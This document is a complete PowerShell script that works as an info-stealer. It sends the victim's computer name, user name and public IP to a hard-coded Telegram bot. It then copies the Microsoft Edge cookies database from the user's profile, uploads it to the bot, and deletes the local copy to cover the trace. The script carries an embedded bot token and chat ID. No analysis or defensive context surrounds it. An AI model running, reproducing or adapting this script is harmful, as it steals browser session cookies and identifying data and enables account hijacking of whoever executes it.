$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$base = "https://api.telegram.org/bot$t"

$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $body

$src = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$dst = "$env:TEMP\Edge_Cookies.db"
Copy-Item $src $dst -Force -ErrorAction SilentlyContinue

if (Test-Path $dst) {
    $uri = "$base/sendDocument?chat_id=$c"
    Invoke-RestMethod -Uri $uri -Method Post -InFile $dst -ContentType "application/octet-stream"
    Remove-Item $dst -Force
}
